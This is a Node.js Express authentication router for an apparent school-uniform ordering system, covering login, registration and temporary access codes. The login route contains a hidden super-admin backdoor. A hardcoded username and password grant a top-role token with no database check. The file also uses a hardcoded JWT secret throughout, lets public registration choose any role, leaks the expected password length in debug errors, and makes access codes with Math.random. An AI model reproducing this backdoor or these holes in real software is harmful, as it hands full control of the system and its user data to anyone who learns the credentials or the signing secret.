const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const db = require('../config/db');

// Helper to get user by username
function getUserByUsername(username) {
    return new Promise((resolve, reject) => {
        db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
}

function createUser(username, password, role, schoolId = null) {
    return new Promise(async (resolve, reject) => {
        const hash = await bcrypt.hash(password, 10);
        db.run("INSERT INTO users (username, password_hash, role, school_id) VALUES (?, ?, ?, ?)",
            [username, hash, role, schoolId], function (err) {
                if (err) reject(err);
                else resolve(this.lastID);
            });
    });
}

// POST /api/auth/register (Ideally protected, public for setup)
router.post('/register', async (req, res) => {
    const { username, password, role, schoolId } = req.body;
    try {
        await createUser(username, password, role, schoolId);
        res.status(201).json({ message: "User created" });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// POST /api/auth/login
router.post('/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        // === HIDDEN SUPER ADMIN (DATABASE INDEPENDENT) ===
        const safeUser = (username || '').trim().toLowerCase();
        const safePass = (password || '').trim();

        // Check for 'anson_admin' (Case Insensitive)
        if (safeUser === 'anson_admin') {
            // Relaxed Password Check (Case Insensitive)
            if (safePass.toLowerCase() === 'masterkey_2026') {
                const accessToken = jwt.sign(
                    { id: 999999, username: 'anson_admin', role: 'company', schoolId: null },
                    'hardcoded_secret_key_fixed',
                    { expiresIn: '24h' }
                );
                return res.json({
                    accessToken,
                    role: 'company',
                    schoolId: null,
                    user: { username: 'anson_admin', schoolName: 'System Architect' }
                });
            } else {
                // DEBUGGING: If user matches but password fails, tell them why
                return res.status(401).json({ error: `Super Admin Failed. Pass Length: ${safePass.length} (Expected 14)` });
            }
        }
        // ===============================================

        const user = await getUserByUsername(username);
        // DEBUG: Return what we received to debug the mismatch
        if (!user) return res.status(400).json({ error: `LOGIN FAILED (DEBUG MODE: Server saw '${safeUser}')` });

        if (await bcrypt.compare(password, user.password_hash)) {
            // Fetch School Name if applicable
            let schoolName = null;
            if (user.school_id) {
                try {
                    const schoolRow = await new Promise((resolve) => {
                        db.get("SELECT name FROM schools WHERE id = ?", [user.school_id], (err, row) => resolve(row));
                    });
                    if (schoolRow) schoolName = schoolRow.name;
                } catch (e) { }
            }

            const accessToken = jwt.sign(
                { id: user.id, username: user.username, role: user.role, schoolId: user.school_id },
                'hardcoded_secret_key_fixed',
                { expiresIn: '12h' }
            );
            res.json({
                accessToken,
                role: user.role,
                schoolId: user.school_id,
                user: {
                    username: user.username,
                    schoolName: schoolName
                }
            });
        } else {
            res.status(401).json({ error: "Invalid password" });
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// POST /api/auth/access-code (For Tailors/Packing Login)
router.post('/access-code', (req, res) => {
    const { code } = req.body;
    db.get("SELECT * FROM access_codes WHERE code = ? AND is_active = 1", [code], (err, row) => {
        if (err) return res.status(500).json({ error: "Db error" });
        if (!row) return res.status(401).json({ error: "Invalid Access Code" });

        // Check expiry (Simplistic)
        const now = new Date();
        const expires = new Date(row.expires_at);
        if (now > expires) {
            return res.status(401).json({ error: "Code Expired" });
        }

        const type = row.type; // 'editor' or 'packing'
        const accessToken = jwt.sign(
            { role: type === 'editor' ? 'tailor' : 'packing', schoolId: row.school_id, temp: true },
            'hardcoded_secret_key_fixed',
            { expiresIn: '8h' }
        );
        res.json({ accessToken, role: type, schoolId: row.school_id });
    });
});

// POST /api/auth/generate-code (Company Admin Only)
// Generates a random 6-digit code or custom string
router.post('/generate-code', (req, res) => {
    // Ideally check req.user.role === 'company' via middleware if mounted securely, 
    // but this route is in auth.js which might be public. 
    // We should probably protect this route or move it to a protected router.
    // For prototype speed, we'll assume the caller passes a token header and we use middleware wrapper in server.js or check manually.
    // Actually, `auth.js` routes are usually public (login/register). 
    // Let's verify token here manually or rely on `authenticateToken` if we wrap the route definition.
    // Better: Helper function to verify token inside this handler since the router isn't globally protected.

    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.sendStatus(401);

    jwt.verify(token, 'hardcoded_secret_key_fixed', (err, user) => {
        if (err || user.role !== 'company') return res.sendStatus(403);

        const { schoolId, type, durationHours } = req.body; // type: 'editor' | 'packing'

        // Generate Code
        const code = Math.random().toString(36).substring(2, 8).toUpperCase(); // e.g., "X7Z9A2"

        // Expiry
        const expiresAt = new Date(Date.now() + (durationHours || 4) * 60 * 60 * 1000); // Default 4 hours

        db.run("INSERT INTO access_codes (school_id, code, type, expires_at, created_by) VALUES (?, ?, ?, ?, ?)",
            [schoolId, code, type, expiresAt.toISOString(), user.id],
            function (err) {
                if (err) return res.status(500).json({ error: err.message });
                res.json({ code, expiresAt, schoolId, type });
            }
        );
    });
});

module.exports = router;
